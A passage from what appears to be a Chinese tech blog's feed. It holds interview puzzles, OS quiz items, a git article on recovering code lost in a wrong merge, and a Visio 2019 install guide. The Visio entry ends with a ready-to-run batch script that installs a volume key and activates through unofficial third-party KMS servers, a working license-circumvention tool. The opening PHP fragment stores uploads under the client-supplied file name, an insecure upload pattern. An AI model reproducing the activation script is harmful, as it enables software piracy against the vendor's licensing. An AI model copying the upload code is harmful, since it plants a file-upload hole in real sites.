目录不存在该文件则将文件上传到 upload 目录下            move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);            echo "文件存储在: " . "upload/" . $_FILES["file"]["name"];        }    }}else{    echo "非法的文件格式";}?&gt;</span><br></pre></td></tr></tbody></table></figure><p>在目录下创建“upload”目录，用于保存上传的图片。  </p><p>如下图所示，为上传文件页面。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcvZXoyUUFEVm5VQ1BybG1iLnBuZw.png" alt="image-20200607210025657"></p><p>上传成功的提示：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/42422/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDcveWk4UDRaN0dqYk1ZNXZYLnBuZw.png" alt="image-20200607210110052"></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
            
        <tag> 后端 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>找工作智力题集锦</title>
      
      
      <link href="/cn/posts/44209/"/>
      
      
      <url>/cn/posts/44209/</url>
      
      
        
      <content type="html"><![CDATA[<p><strong>1 .0，1，2，3，⋯，499，500共501个数按升序排列，每次取奇数序位的数丢掉，然后取剩下的数的奇数序位的数丢掉，重复这个过程，那么最后剩下的数是多少？</strong><br>答案 ：255</p><p>简单例举下：0   1    2    3    4  5    6    7    8    9   10    11<br>    第一次剩下的    1    3    5    7  9    11       规律： 2i-1<br>                            （ i为整数   1&lt;=i&lt;= n/2 （n表示给出序列的元素个数，例子中是12，而题目中是501））<br>    第二次剩下的    3     7    11                               4i- 1                    1&lt;=i&lt;= n/4<br>    第3次剩下的        7                                           8i- 1                     1&lt;=i&lt;= n/8</p><p>   相信已经差不多了。每次剩下的元素为   2^x-1    满足条件的只有  255=2^8-1 .当然这是选择题可以直接选答案。<br>    正确做法是： 最后剩下一个元素，那么进行了几次筛选过程呢？   i取值只能是1，<br>    那么 501/（2^x）&lt;2    取x=8;<br>    那么剩下的元素是2^8-1=255<br>    仔细观察都是一的二进制数最后出列。 </p><p><strong>32!的计算结果，尾数总共有几个零？</strong><br>答案：7个<br>2*5可以得到零，即转为求因子数。<br>2因子远大于5，求5就行<br>这里可以有公式：<br>5！：5 / 5 = 1<br>25！： 25/5  + 25/25= 6（有2有5+1个5，5 10 15 20 25，25有两个五，也就是每有一个25要多一个零，以下同理）<br>32！：32/5 + 32/25 =7<br>1024!：1024/5 + 1024/25 + 1024/125 + 1024/625 = 253</p><p><strong>站在地球上的某一点，向南走一公里，然后向东走一公里，最后向北走一公里，回到了原点。地球上有多少个满足这样条件的点?</strong><br>答案：无数个<br>从逻辑上来讲，题目从好像缺少了一次向西的过程，才可以回到原地。有没有可能向东1公里还在原地，答案是肯定的，如果有一个纬度，绕其一圈恰好是1公里即可实现，所以这样的点有无穷多个，只要找到那个纬度即可。（就像你在赤道上，要回到原点怎么办呢，向东或西走赤道这么长就可以了）<br>北极点的起点出发刚好走了一个正三角形，所以可以返回原点。</p><p><strong>1,32,81,64,25,(6),1</strong><br>$1^6=1$<br>$2^5=32$<br>$3^4=81$<br>$4^3=64$<br>$5^2=25$<br>$6^1=6$<br>$7^0=1$</p><p><strong>N个球中有一个假冒伪劣(重量不足)，如果给你一个天平允许你测 3 次找出那个假冒伪劣，问 N 可能的值</strong></p><p>三个一次就可以测出来。A B C，三个球中有一个次品，只要测一下A B是否等重，则次品在C；如果A B不等重，那就可以分出来次品。<br> $3<em>3 = 9$ 个以内 2 次，$3</em>3*3 = 27$ 个以内，3次！所以，有个公式：n 次可以测出来 $3^n$ 以内的假冒伪劣</p><p><strong>某单位组织党员参加党史，党风廉政建设，科学发展观和业务能力四项培训，要求每名党员参加且只能参加其中的两项，无论如何安排，都至少有 5 名党员参加的培训完全相同，请问该单位至少有多少名党员？</strong><br>4门课程，每人选2门，有$C_4^2=6$中选法；此时根据抽屉原理，将这6中选法想象为6个抽屉，在每个抽屉中放入4个党员，则有24名党员；此时，再多来一名党员，则无论将其安排在哪个抽屉，6个抽屉中都必有一个里面装的是5名党员。所以，该机关至少有24+1=25名党员。</p><p><strong>小松鼠采到了100 颗坚果要运回家。家离放坚果的地方有100 米远。小松鼠每次最多运 50 颗。BUT！小松鼠很馋。。。每走2 米就要吃一颗坚果。。。返回时不会再吃坚果，问小松鼠最多能运回家多少颗坚果？</strong><br>答案：25</p><p>设采坚果的地点为A，家为B，从A到B方向的运动需要消耗坚果。题目求最多运多少坚果回家，为使结果最大化，所以需要每次开始都运50颗，所以题目也就是求最少的坚果消耗量，由于A-&gt;B方向的运动一直要消耗坚果，所以也就是求此方向运动的最少距离。由于每次做多运50颗，所以有一段A-&gt;B方向必须走两次，设这段距离为x，剩下的距离为y，则有x+y=100。消耗的总坚果数为(2x+y)/2。并且为了使最后y段能够运走所有2x段剩下的坚果，需要满足2*(50-x/2)&lt;=50，所以x&gt;=50。由于要使(2x+y)/2=(x+100)/2最小，所以x应该去最小值50,所以消耗坚果数为（50+100）/2=75，所以剩下25个。<br>另：假如松鼠每走两步就要吃坚果，那么答案应该是17颗。</p><p><strong>在?处答案为()</strong><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/44209/20200330202952584.png" alt="在这里插入图片描述"><br>答案：B<br>前两列（1、2列）移动到2、3列，第三列挪到第一列，<strong>但是</strong>第三列第三行要变第一列第一行，其他的往下挪（即第三列第一行变第一列第二行，即第三列第二行变第一列第三行）， 然后叉变圆，圆变三角，三角变叉。（不理解的可以画图试试）</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 面试 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>操作系统题目集锦</title>
      
      
      <link href="/cn/posts/46653/"/>
      
      
      <url>/cn/posts/46653/</url>
      
      
        
      <content type="html"><![CDATA[<p><strong>在硬件和环境相同的条件下，一个作业在（分页）存储管理系统中运行的时间最长。</strong><br>分页式存储管理可能将连续的指令放置在不同的页中，会发生换页中断，而分段、段页都是逻辑分配空间，段长可变，逻辑上相对连续的指令放在同一段中，不会像分页那样频繁换页操作。</p><p><strong>设从磁盘将一块数据传送到缓冲区所用实际为80μs，将缓冲区中数据传送到用户区所用时间为40μs，CPU处理数据所用的时间为30μs。则处理该数据，采用单缓冲传送磁盘数据，系统所用总时间为（120μs）。</strong><br> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/46653/20200328213029515.png" alt="在这里插入图片描述"><br> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/46653/20200328213040915-16329844525871.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 操作系统 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>git合并丢失代码问题分析与解决(错误操作导致)</title>
      
      
      <link href="/cn/posts/25541/"/>
      
      
      <url>/cn/posts/25541/</url>
      
      
        
      <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>我们在主干dev和branch1分支上进行并行开发。当要把branch1功能的代码合并到dev上时，发现dev上开发的部分功能代码找不到了。</p><p>那么，是在branch1上，作了删除提交导致的吗？然而，查提交日志，并没有发现删代码的提交记录。</p><p>难道一个分支有一个功能，另一个分支没这个功能，git合并时就有可能把这块功能代码丢掉？跟功能添加时间顺序有关系？</p><p>为了解决这个问题和相关的疑问，我们需要先了解下git合并的过程。</p><h2 id="git-merge过程"><a href="#git-merge过程" class="headerlink" title="git-merge过程"></a>git-merge过程</h2><p>稍微了解点git基础的应该都知道，合并是用的git merge命令。它只有两种，一种是快速合并(fast-forward)，还有一种是三方合并(thirdparty merge)。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25541/972306-c0cbace0c872146b.png" alt="img"></p><p>如上图所示，当两个分支有直系关系时，使用快速合并，git不产生新的commit结点，只是把head进行更新，如dev指向<code>C4</code>。</p><p>三方合并稍显复杂点，它会产生一个新的commit结点，并把head指向它。它会先去找这两个要合并分支的最近公有结点，如图中，<code>C3</code> 和 <code>C5</code>的最近公有父结点为<code>C1</code>。然后，git对 <code>C1</code>、<code>C3</code>和<code>C5</code>三个结点进行三方合并产生新结点<code>C6</code>。这里的三方合并，具体来说，就是把 <code>C5</code>相较于<code>C1</code>的 diff差异应用到 <code>C3</code>上，最后产生<code>C6</code> 这个commit结点。</p><p>现在回答上面的疑问，三方合并其实只看三个点的内容，和中间结点无任何关系，更别提跟时间有关系了。在一个分支上删除代码，如果合并时没有冲突的话，合并后是会直接删除的。</p><p>所以，我们找到了问题的初步方向了。dev上的代码合并后没了，一定是branch1分支有问题！！！</p><blockquote><p>注：知道了git-merge的流程后，我们还可以知道，只要我们把这次合并代码丢失问题解决了，后续从branch1分支拉出去的分支代码再合并到dev时，都不用再解决这个代码丢失问题了。因为，合并后的提交结点和branch1分支拉出去分支的后续提交结点的父结点，已经变成branch1的当前结点了。如，<code>C6</code>的后续提交和<code>C5</code>的后续提交结点，公有结点都变成<code>C5</code>了。</p></blockquote><h2 id="问题起因及检测"><a href="#问题起因及检测" class="headerlink" title="问题起因及检测"></a>问题起因及检测</h2><p>为了描述问题方便，我把场景简化，搞了个demo，大家可以去下面地址clone：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git clone https://git.coding.net/myswift/git-merge.git</span><br></pre></td></tr></tbody></table></figure><p>提交记录用sourcetree看，是这样的（你可能已经发现问题了）：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25541/972306-2041ea44556fae85.png" alt="img"></p><p>dev合并branch1时，dev上，<code>dev func 1</code>部分的提交丢失。</p><p>首先，让我们找最近公共结点吧。如果两个分支并行太久的话，可能不好直接找出来。我们可以使用git merge-base:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git merge-base 98d19a4 0acedcb</span><br><span class="line">9447776f5ee8c53536c947a1e13bfdead13f002b </span><br></pre></td></tr></tbody></table></figure><p>我们发现最近的公共结点是<code>9447776</code>。然而，这个公共结点，并不是我们设想的。我们设想的最近公共结点应该是两个分支刚开始并行的那个结点（如图中<code>c3275e2</code>)。进一步发现，<code>9447776</code>的下一个结点有个Merge，而且是把dev合并到branch1！！！</p><p>这就是问题的根源了，dev主干开发的一般是下个版本的功能，一般是把分支的代码合到主干上，把主干的代码逆向合并到分支上肯定是有问题的！！！</p><p>回到开头的问题，我们看Merge结点变更记录，并没有发现有删除代码的地方啊？原因是，你看到的合并结点的修改记录，是针对一边的。回到介绍三方合并的那个图，把branch1合并到dev产生结点<code>C6</code>，那么<code>C6</code>的提交记录中显示的修改，是<code>C6</code>针对<code>C3</code>结点的。在我们的示例中，合并结点<code>74a8d10</code>的提交变更，显示的是<code>74a8d10</code>对branch1中<code>c26c5e3</code>的变更，而branch1中本来就没有dev中的代码，所以合并后变更根本不会显示删除。</p><p>如果，你去比较合并结点和另一边的变更，你就可以发现问题：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># git diff 9447776 74a8d10</span><br><span class="line">diff --git a/test.c b/test.c</span><br><span class="line">index 150de8d..d19a020 100644</span><br><span class="line">--- a/test.c</span><br><span class="line">+++ b/test.c</span><br><span class="line">@@ -7,8 +7,8 @@ void base_func() {</span><br><span class="line">        printf("this is a crash %d\n", *p);</span><br><span class="line"> }</span><br><span class="line"></span><br><span class="line">-void dev_func_1() {</span><br><span class="line">-       printf("dev func 1\n");</span><br><span class="line">+void branch_func_1(){</span><br><span class="line">+       printf("branch func1\n");</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>你可以明显看到，在合并时，把dev中的<code>dev_func_1</code>函数删除掉了。</p><p>总结问题的原因是，在正式合并前，进行了逆向的合并，并在合并中<code>悄悄</code>把主干代码删除掉了。一般如果查看提交记录中，没有看到删除记录，那么很有可能是之前的Merge中把代码删除了。可以使用 <code>merge-base</code>和<code>git diff</code> 工具来进行定位，也可以用来检测是否有问题。</p><blockquote><p>注：很多人可能认为只要管好自己的分支就行了，然后把别的分支合过来，并在合并时或合并后随意删除另一分支的代码。这样当以后再和该分支合并时，就会有问题。好的做法，应该是只把另一个分支上你需要的提交用cherry-pick移过来，而不是直接合并别人的分支，再删除你不需要的代码。如，只把dev上的<code>fec5b84</code>优化cherry-pick复制到branch1上即可。</p></blockquote><h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><p>既然我们发现了问题的原因，并知道怎么去规避、检测。那么，如果已经发生了问题，怎么去解决呢？这个可能是大家更关心的。</p><p>其实我们最终的目标是，把branch1和dev进行合并，产生一个合并节点，并且这个合并结点的代码是正确的。</p><blockquote><p>注：有些人可能不太明白为什么一定要产生一个git合并记录节点。通过各种手段，只要保证dev上代码正确不就行了？结论是不行，因为如果没有git合并记录的话，从branch1拉出来的所有分支再想合并到dev时，还是要解决下这个代码丢失的问题（没想明白，可以再看下前面git-merge过程部分)，而且如果把branch1分支悬着不合并，也影响分支查看。</p></blockquote><h3 id="确保合并后代码正确"><a href="#确保合并后代码正确" class="headerlink" title="确保合并后代码正确"></a>确保合并后代码正确</h3><p>奔着这个目标，我们首先来确保代码的正确。</p><h4 id="1-dev重置到合并前"><a href="#1-dev重置到合并前" class="headerlink" title="1. dev重置到合并前"></a>1. dev重置到合并前</h4><p>既然最后合并branch1到dev会导致dev丢代码，我们首先把dev重置到合并前。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git checkout dev</span><br><span class="line"># git reset --hard HEAD~1</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25541/972306-b6cb91c36028672f.png" alt="img"></p><h4 id="2-创建tmp分支，绕过错误的合并74a8d10"><a href="#2-创建tmp分支，绕过错误的合并74a8d10" class="headerlink" title="2. 创建tmp分支，绕过错误的合并74a8d10"></a>2. 创建tmp分支，绕过错误的合并<code>74a8d10</code></h4><p>我们知道branch1是有问题的，因为进行了合并dev的操作。所以，基于branch1创建一个临时分支tmp。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git checkout branch1</span><br><span class="line"># git checkout -b tmp</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25541/972306-1a83be3f1e564eea.png" alt="img"></p><p>把tmp的提交记录重塑，使tmp分支回到branch1上的，合并dev到branch1那个错误的合并之前的结点，示例中 <code>74a8d10</code>之前的那个<code>c26c5e3</code>结点，并提交一个新记录，这样tmp内容与branch1一样，而完全跟那个<code>74a8d10</code>结点没关系了。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># git checkout tmp</span><br><span class="line"># git reset c26c5e3</span><br><span class="line"># git add .</span><br><span class="line"># git commit -m "内容与branch1一致"</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25541/972306-0347e3a5dc0b5726.png" alt="img"></p><blockquote><p>注：reset和reset –hard的区别，可以参考文末资料1。</p></blockquote><h4 id="3-合并tmp到dev"><a href="#3-合并tmp到dev" class="headerlink" title="3. 合并tmp到dev"></a>3. 合并tmp到dev</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git checkout dev</span><br><span class="line"># git merge tmp</span><br></pre></td></tr></tbody></table></figure><p>这里dev和tmp合并时，它们的最近公共结点就不是之前错误的<code>9447776</code>了，而是我们设想的、dev和branch1最初分开的，<code>c3275e2</code>结点。</p><p>解决冲突，并add进暂存区后，我们代码就是正确的了（先不急着提交）。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25541/972306-d68ba36ae196a482.png" alt="img"></p><h3 id="产生合并commit对象"><a href="#产生合并commit对象" class="headerlink" title="产生合并commit对象"></a>产生合并commit对象</h3><p>上面代码正确了，如果我们直接commit的话，这个合并结点，就变成dev和tmp的合并了，而我们要的是dev和branch1的合并。所以，我们要产生一个dev和branch1合并的结点，并且内容是当前dev和tmp合并后的代码。显然，git merge不能满足我们的需求，我们需要更底层的git命令，就是git merge过程中，调用的底层命令。</p><p>需要按序要用到 write-tree -&gt; commit-tree -&gt; update-ref，这三条底层命令。这部分命令，可以查看参考资料2。</p><h4 id="1-write-tree产生tree对象"><a href="#1-write-tree产生tree对象" class="headerlink" title="1. write-tree产生tree对象"></a>1. write-tree产生tree对象</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># git add .</span><br><span class="line"># git write-tree</span><br><span class="line">853c36012082314f9463f3819d0a24da49dc5bb1</span><br></pre></td></tr></tbody></table></figure><p>我们产生了SHA-1值为 <code>853c360</code>的tree对象。</p><h4 id="2-commit-tree产生commit对象"><a href="#2-commit-tree产生commit对象" class="headerlink" title="2. commit-tree产生commit对象"></a>2. commit-tree产生commit对象</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git commit-tree 853c360 -p 98d19a4 -p 0acedcb -m "Merge branch 'branch1' into dev"</span><br><span class="line">675baf3973508ee03306cc5a36fe489d694e107f</span><br></pre></td></tr></tbody></table></figure><p>我们把tree对象 <code>853c360</code>进行了提交，并设置它的两个父结点为dev和branch1，产生了commit对象<code>675baf3</code>。我们可以看下这个结点的情况：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># git cat-file 675baf3 -p</span><br><span class="line"></span><br><span class="line">tree 853c36012082314f9463f3819d0a24da49dc5bb1</span><br><span class="line">parent 98d19a4a5913f18a2c0e9821e114df9995b23d82</span><br><span class="line">parent 0acedcb89e4d25a0256fcbe7fba0bbc13de9d92e</span><br><span class="line">author Vincent &lt;xxx&gt; 1498497182 +0800</span><br><span class="line">committer Vincent &lt;xxx&gt; 1498497182 +0800</span><br><span class="line"></span><br><span class="line">Merge branch 'branch1' into dev</span><br></pre></td></tr></tbody></table></figure><h4 id="3-更新head"><a href="#3-更新head" class="headerlink" title="3. 更新head"></a>3. 更新head</h4><p>使用如下命令，更新dev指向这个新的commit对象, <code>675baf3</code>：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git update-ref refs/heads/dev 675baf3</span><br></pre></td></tr></tbody></table></figure><p>最终合并结果如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/25541/972306-d2fd738427b372b5.png" alt="img"></p><p>可以验证，branch1合并到dev了，而且内容是正确的（即不会少<code>dev fun 1</code>部分的代码）。</p><p>这个解决问题的示例代码，也上传到coding了，两份示例代码，之前的结点都是一致的。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git clone https://git.coding.net/myswift/git-merge2.git</span><br></pre></td></tr></tbody></table></figure><blockquote><p>注：知道了git merge这些底层命令，你可以更加灵活地解决git问题，你可以结点随意合并，head随便指，是不是很开心，哈哈。</p></blockquote><h4 id="更粗暴的方法"><a href="#更粗暴的方法" class="headerlink" title="更粗暴的方法"></a>更粗暴的方法</h4><p>如果你觉得底层命令不好理解。你可以：</p><ul><li>先整个目录拷备下工程（包含.git目录)，比如拷贝到bak目录</li><li>在工程中直接合并branch1到dev上，不解决冲突，不提交</li><li>在bak目录，按照上面确保代码正确的方法，在bak目录合并出正确的代码。</li><li>把bak目录中，除了.git目录外的东东，全部拷贝覆盖到原来工程目录中</li><li>在原来工程目录中，提交</li></ul><p>这样比较好理解，缺点是工程如果大的话，拷来拷去花费时间比较长，而且不够优雅。</p><h2 id="其他解决思路"><a href="#其他解决思路" class="headerlink" title="其他解决思路"></a>其他解决思路</h2><p>上面描述的思路，我认为是最行之有效的。也试了其他思路，比如：</p><ul><li>查看git merge的参数，发现并没有可以自由设置base节点的方法，只有设置发现base节点的策略，而且这些策略发现的base节点都是那个错误的合并。</li><li>undo merge。参考资料3。然而，感觉revert merge的能力有限，加-m1参数、和-m2参数，均无法满足要求。</li><li>rebase branch1。错误发生在branch1，那么重建branch1呢？把所有branch1上合并后的提交都重新提交呢？结果发现branch1上有太多合并冲突，rebase时，要把这个合并的冲突重新解决，很麻烦。</li></ul><p>这些思路，大家也可以继续研究下，感觉不能解决问题，也可能是我了解得有问题。当然，你有其他思路，也希望你交流下。</p><h2 id="迷思"><a href="#迷思" class="headerlink" title="迷思"></a>迷思</h2><p>本文中，是因为错误地把dev合并到branch1上，导致了后面合并的问题。但是，我们真实遇到的场景，虽然看起来是一样的，也可以用文中的方法解决，但是也有细微不同，而且不知道如何出现这个问题。</p><p>真实的场景下，也会出现一个dev合并到branch1的Merge提交，但是显示的信息是 “Revert xxx”，据提交人员讲，这个确实是做的Revert操作，不知如何变成Merge结点了。用的sourcetree，提交人员也没法说清怎么必现这个问题。</p><p>如果，你知道怎么操作能出现这个问题，希望你告诉我。。。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>文中描述了一种可能导致git合并代码丢失的错误操作，并讲解了如何规避、检测、解决这种错误。并粗略介绍了，git merge流程，git merge底层过程。</p><p>说简单点，问题是因为<code>悄悄</code>在合并中把代码删除了。解决思路是，<code>悄悄</code>在后面的合并中把代码加回来。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/geeeeeeeeek/git-recipes/wiki?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io">1. git-recipes</a></p><p><a href="http://git.oschina.net/progit/9-Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86.html#9.2-Git-%E5%AF%B9%E8%B1%A1">2. Git 内部原理-commit对象</a></p><p><a href="https://git-scm.com/blog/2010/03/02/undoing-merges.html">3. Reverting a Merge</a></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> git </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Visio2019一键安装激活</title>
      
      
      <link href="/cn/posts/30340/"/>
      
      
      <url>/cn/posts/30340/</url>
      
      
        
      <content type="html"><![CDATA[<p>如何让即点即用的Office365和Visio2019共存？<br>共存是不可能共存滴，但是有其他解决方法~</p><p>此方法也可直接用于安装Visio2019</p><ol><li>先下载Office部署工具，安装时选择解压路径，解压后有setup.exe和三个xml配置文件，因为我安装的Office365是64位的，所以修改对应64位的配置文件。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/30340/20191030130922809.jpg" alt="在这里插入图片描述"></li><li>编辑configuration为以下内容，将语言设置为zh-cn<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">Add</span> <span class="attr">OfficeClientEdition</span>=<span class="string">"64"</span> <span class="attr">Channel</span>=<span class="string">"Monthly"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">Product</span> <span class="attr">ID</span>=<span class="string">"VisioPro2019Volume"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Language</span> <span class="attr">ID</span>=<span class="string">"zh-cn"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Add</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure></li><li>在以上所在的目录下启动命令行，执行setup.exe /download configuration-Office365-x64.xml  下载过程比较慢。下载完成后会发现目录下多了Office目录，然后继续执行安装命令setup.exe /configure configuration-Office365-x64.xml 就可以了。</li><li>激活 把以下代码保存为bat运行即可<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title Activate Microsoft Visio 2019&amp;cls&amp;echo ============================================================================&amp;echo #Visio: Activating Microsoft software products for FREE without software&amp;echo ============================================================================&amp;echo.&amp;echo #Supported products:&amp;echo - Microsoft Visio Standard 2019&amp;echo - Microsoft Visio Professional Plus 2019&amp;echo.&amp;echo.&amp;(if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles%\Microsoft Office\Office16")&amp;(if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles(x86)%\Microsoft Office\Office16")&amp;cscript //nologo ospp.vbs /inslic:"..\root\Licenses16\pkeyconfig-office.xrm-ms" &gt;nul&amp;(for /f %%x in ('dir /b ..\root\Licenses16\client-issuance*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" &gt;nul)&amp;(for /f %%x in ('dir /b ..\root\Licenses16\visioprovl_kms*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" &gt;nul)&amp;(for /f %%x in ('dir /b ..\root\Licenses16\visiopro2019vl_kms*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" &gt;nul)&amp;echo.&amp;echo ============================================================================&amp;echo 正在尝试激活...&amp;cscript //nologo ospp.vbs /unpkey:7VCBB &gt;nul&amp;cscript //nologo ospp.vbs /inpkey:9BGNQ-K37YR-RQHF2-38RQ3-7VCBB &gt;nul&amp;set i=1</span><br><span class="line">:server</span><br><span class="line">if %i%==1 set KMS_Sev=kms8.MSGuides.com</span><br><span class="line">if %i%==2 set KMS_Sev=kms9.MSGuides.com</span><br><span class="line">if %i%==3 set KMS_Sev=kms7.MSGuides.com</span><br><span class="line">if %i%==4 goto notsupported</span><br><span class="line">cscript //nologo ospp.vbs /sethst:%KMS_Sev% &gt;nul&amp;echo ============================================================================&amp;echo.&amp;echo.</span><br><span class="line">cscript //nologo ospp.vbs /act | find /i "successful" &amp;&amp; (echo 已完成，按任意键退出) || (echo 连接KMS服务器失败! 试图连接到另一个… &amp; echo 请等待... &amp; echo. &amp; echo. &amp; set /a i+=1 &amp; goto server)</span><br><span class="line">pause &gt;nul</span><br><span class="line">exit</span><br></pre></td></tr></tbody></table></figure></li></ol>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Windows </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>高精度除法</title>
      
      
      <link href="/cn/posts/31191/"/>
      
      
      <url>/cn/posts/31191/</url>
      
      
        
